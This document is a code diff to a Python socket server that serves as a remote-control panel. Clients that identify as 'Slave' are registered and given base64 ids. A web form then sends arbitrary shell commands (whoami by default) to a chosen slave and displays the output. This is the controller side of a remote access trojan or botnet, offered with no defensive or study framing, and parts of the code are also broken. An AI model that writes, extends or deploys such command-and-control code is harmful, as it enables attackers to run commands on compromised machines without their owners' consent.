@@ -1,5 +1,8 @@
 import socket
 import pdb
+import base64
+import urllib.parse
+from urllib.parse import unquote_plus
 from optparse import OptionParser
 from threading import Thread
 from jinja2 import Template
@@ -29,19 +32,23 @@ while True:
     connection, client_addr = sock.accept()
     print(f'New conn from {client_addr}')
     if client_addr[1] not in ('localhost', '127.0.0.1'):
-        connections.append({
+        conn = {
             'conn': connection,
             'ip': client_addr[0],
-            'port': client_addr[1]
-        })
+            'port': client_addr[1],
+            'url': base64.b64encode(f'{client_addr[0]}:{client_addr[1]}'.encode('utf-8')).decode('utf-8')
+        }
+
     payload = b'whoami'
     data = connection.recv(1024).decode('utf-8')
-    if data.startswith('GET'):
-        print(data)
+
+    # slave connected
+    if data.startswith('Slave'):
+        connections.append(conn)
     if data.startswith('GET / '):
         # payload URLs: POST /b64<payload>?b64<host:port>
         # add payload input field
-        print(data)
+        print(f'Web interface Request data: << {data}')
         with open('index.html') as file_:
             template = Template(file_.read())
         # check connections if actual/exclude web conns
@@ -53,23 +60,29 @@ while True:
     elif data.startswith('GET /favicon'):
         connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
         connection.close()
-    elif data.startswith('POST /'):
+    elif data.startswith('GET /payload_'):
         # encode payload b64
-        # payload: POST /b64<payload>?b64<host:port>
-        host, port = data.split()[1].split('?')[1].split(':')
-        connection = None
+        # payload: POST /b64<host:port>
+        # pdb.set_trace()
+        # payload from textarea form input
+        host, payload = data.split()[1][9:].split('?payload=') #b64decode split(':')
+        payload = unquote_plus(payload)
+        #host, port = base64.b64decode(host).decode('utf-8').split(':')
+        slave_connection = None
         for conn in connections:
-            if conn['ip'] == host and conn['port'] == port:
-                connection = conn
-            # payload
+            if conn['url'] == host:
+                slave_connection = conn
+                break
         print(f'sending payload to {host}: >> {payload}')
-        connection.sendall(payload)
+        slave_connection['conn'].sendall(payload.encode('utf-8'))
         # render payload result
-        response_data = connection.recv(1024)
-        print(response_data)
+        response_data = slave_connection['conn'].recv(1024).decode('utf-8')
+        print(f'Slave {host} reply: << {response_data}')
         response = template.render(response=response_data)
         connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
         connection.send(response.encode('utf-8'))
+    elif data.startswith('GET'):
+        print(f'Request data: << {data}')
     elif not data: break  # else?
-    print(data)
+    # print(data)
     print(f'{client_addr}: << {data}')
